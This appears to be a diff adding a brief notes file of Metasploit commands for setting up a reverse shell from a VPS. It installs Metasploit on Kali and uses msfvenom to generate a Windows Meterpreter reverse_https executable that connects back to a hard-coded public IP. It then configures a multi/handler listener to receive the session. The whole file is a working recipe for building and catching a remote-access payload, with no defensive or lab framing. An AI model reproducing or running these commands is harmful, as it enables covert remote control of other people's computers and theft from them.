@@ -1,0 +1,12 @@
+(reverse shell with metaspoitable in vps)
+#git clone https://github.com/rapid7/metasploit-framework.git
+(server kali)
+(sudo apt update)
+(sudo apt install metasploit-framework -y)
+(msfvenom --payload windows/meterpreter/reverse_https lhost=150.129.29.98 lport=8080  --format exe --out vexe.exe)
+(msfconsole)
+(use exploit/multi/handler) 
+(set payload windows/meterpreter/reverse_https)
+(set lhost 192.168.31.226)
+(set lport 8080)
+(exploit)
